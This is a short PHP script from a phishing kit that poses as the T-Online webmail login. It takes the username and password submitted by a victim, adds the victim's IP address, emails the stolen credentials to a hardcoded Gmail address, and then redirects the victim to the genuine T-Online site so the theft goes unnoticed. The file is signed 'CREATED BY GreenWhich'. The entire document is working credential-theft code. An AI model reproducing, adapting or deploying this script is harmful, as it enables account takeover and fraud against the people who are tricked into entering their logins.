<?php   ob_start();  ?>

<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--+ https://email.t-online.de/ +--\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "--------------------------------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "-------+ CREATED BY GreenWhich +--------\n";

$send="jbrautigam80303@gmail.com";


$subject = "TONLINE | ".$_POST['username']." | $ip";
$headers = "From: sm+kk <inbox@online.com>";
@mail($send,$subject,$message,$from);
@header("Location: https://email.t-online.de/");

?>
